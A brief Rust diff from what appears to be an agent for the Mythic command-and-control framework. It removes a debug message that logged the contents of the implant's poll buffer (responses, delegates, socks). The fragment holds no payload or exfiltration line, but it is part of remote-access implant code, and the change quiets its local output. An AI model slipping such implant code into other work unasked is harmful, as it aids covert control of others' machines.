@@ -149,10 +149,6 @@ pub fn initialize(
 /// Called by poll-based profiles (HTTP) each iteration of their polling loop.
 pub fn drain_poll_buffer() -> MythicMessage {
     let mut buf = POLL_BUFFER.lock().unwrap();
-    if !buf.is_empty() {
-        eprintln!("[sebastian] Draining poll buffer: {} responses, {} delegates, {} socks",
-            buf.responses.len(), buf.delegates.len(), buf.socks.len());
-    }
     create_mythic_poll_message(&mut buf)
 }
 
